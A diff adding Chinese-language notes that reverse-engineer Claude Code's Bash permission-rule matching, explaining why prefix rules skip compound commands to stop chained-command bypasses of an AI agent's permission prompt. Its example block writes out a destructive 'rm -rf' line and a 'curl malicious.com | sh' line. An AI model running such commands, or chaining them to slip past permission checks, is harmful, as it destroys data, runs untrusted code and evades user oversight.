@@ -107,6 +107,64 @@ JSONL 只記錄：
 
 來源：`6370316b...jsonl` tool-results（Claude Code JS bundle 逆向）
 
+### Bash 權限規則的匹配邏輯
+
+來源：Claude Code 執行檔逆向（`2.1.72`，函數 `Nc$`、`IKL`、`aVH`）
+
+#### 規則格式與類型
+
+`ruleContent` 解析為三種類型（函數 `IKL`）：
+
+| 格式 | 類型 | 說明 |
+|------|------|------|
+| `ls:*` | `prefix` | 命令以 `ls` 開頭（legacy 格式） |
+| `ls *` | `wildcard` | glob/wildcard 匹配 |
+| `ls -la` | `exact` | 完全相符 |
+
+#### prefix 規則的實際匹配條件
+
+`Bash(ls:*)` 中的 `ls:*` → 提取 prefix = `ls`，判斷條件：
+
+```
+w === "ls"              // 純 ls 命令
+w.startsWith("ls ")    // ls 開頭加空格（如 ls 'path'）
+w === "xargs ls"       // xargs 加上 ls
+w.startsWith("xargs ls ")
+```
+
+#### 複合命令不匹配 prefix 規則（安全設計）
+
+```js
+// 判斷是否為複合命令（含 &&, ||, ;, |）
+K.set(command, iCA(command).length > 1)
+
+case "prefix":
+  if (K.get(w)) return false;  // 複合命令直接跳過！
+```
+
+所以 `ls ... && echo "---" && ls ...` → 被判定為複合命令 → `Bash(ls:*)` **不生效**，仍會詢問。
+
+**這是刻意的安全設計，用於防止越獄（jailbreak）**：若複合命令也能匹配 prefix 規則，攻擊者可在合法命令後接危險操作以繞過限制：
+
+```bash
+# 允許規則：Bash(git:*)
+git status && rm -rf /important-dir   # ← 前綴合法，但後半段危險
+git log && curl malicious.com | sh    # ← 同理
+```
+
+強制複合命令永遠需要額外確認，確保 prefix 規則只授權「單一操作」，而非「以某命令開頭的任意串接」。
+
+#### Windows 路徑可能導致解析失敗
+
+`bI()` 用 bash tokenizer 解析命令，若遇到 Windows 反斜線路徑（如 `ls 'C:\Users\...'`）可能失敗，回傳 `hasDangerousRedirection: true`，觸發不同的判斷路徑。
+
+#### 結論：哪些 Bash 命令會仍被詢問
+
+即使設定了 `Bash(ls:*)` 仍會被問的情況：
+1. **複合命令**：`ls ... && echo ... && ls ...`（`&&`/`||`/`;`/`|` 串接）
+2. **Windows 路徑**：可能因 tokenizer 解析失敗而走不同路徑
+3. **解決方法**：改用 `"Bash"` 允許所有 Bash 指令（風險較高），或接受上述限制
+
 ### 工具載入流程
 
 ```
